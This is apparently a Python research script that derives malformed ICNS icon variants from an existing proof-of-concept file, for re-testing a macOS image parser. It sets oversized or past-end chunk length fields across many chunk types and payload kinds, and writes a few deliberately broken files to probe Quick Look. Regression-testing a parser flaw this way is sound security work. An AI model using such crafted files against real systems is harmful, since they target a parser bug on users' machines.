#!/usr/bin/env python3
# make_variants.py — derive ICNS test variants for the macOS 27.0.1 re-test.
#
# Usage: make_variants.py <pocs/icns.icns> <legitimate .icns> <out_dir>
#
# Nothing here is new research input: every file is either the PoC or a
# legitimate system icon with one 32-bit length field changed, plus a few
# deliberately broken files used only to check Quick Look's behaviour.
import os
import struct
import sys

BIG = 0x97979797  # the PoC's ic13 chunk length


def setlen(b, off, v):
    return b[:off] + struct.pack('>I', v) + b[off + 4:]


def main():
    poc = open(sys.argv[1], 'rb').read()
    legit = open(sys.argv[2], 'rb').read()
    out = sys.argv[3]
    os.makedirs(out, exist_ok=True)

    def w(name, data):
        open(os.path.join(out, name), 'wb').write(data)

    # 1. Single-field changes to the PoC and to a legitimate icon.
    first_len = struct.unpack('>I', legit[12:16])[0]
    single = legit[:8 + first_len]
    single = setlen(single, 4, len(single))
    w('P0_poc.icns', poc)
    w('P1_poc_ic13len_fits.icns', setlen(poc, 12, len(poc) - 8))
    w('P2_poc_hdrtotal_fixed.icns', setlen(poc, 4, len(poc)))
    w('L0_legit.icns', legit)
    w('L1_legit_firstlen_BIG.icns', setlen(legit, 12, BIG))
    w('L2_single_first_chunk.icns', single)
    w('L3_single_firstlen_BIG.icns', setlen(single, 12, BIG))
    w('L4_single_firstlen_EOFplus1.icns', setlen(single, 12, len(single) - 8 + 1))
    w('L5_single_hdrtotal_BIG.icns', setlen(single, 4, BIG))

    # 2. Matrix: chunk type x payload x oversized length.
    body = poc[0x10:]
    payloads = {
        'junk': body,
        'argb': b'ARGB' + body[4:],
        'jp2': bytes.fromhex('0000000c6a5020200d0a870a') + body[12:],
        'png': poc[0x70:] + b'\0' * (len(body) - len(poc[0x70:])),
    }
    for t in ['ic13', 'ic07', 'ic08', 'ic09', 'ic10', 'ic14',
              'ic04', 'ic05', 'it32', 'is32', 'icp4']:
        for pn, pl in payloads.items():
            for ln, lv in [('BIG', BIG), ('EOF1', 8 + len(pl) + 1)]:
                w(f'M_{t}_{pn}_{ln}.icns',
                  b'icns' + struct.pack('>I', 0x7c8) + t.encode()
                  + struct.pack('>I', lv) + pl)

    # 3. Broken files that are unrelated to the length field (Quick Look check).
    pattern = bytes(range(256)) * 4
    w('G1_patterned.icns', b'icns' + struct.pack('>I', 796) + b'ic13'
      + struct.pack('>I', 788) + pattern[:780])
    w('G2_header_only.icns', b'icns' + struct.pack('>I', 8))
    w('G3_broken.png', bytes.fromhex('89504e470d0a1a0a') + pattern[:300])


if __name__ == '__main__':
    main()
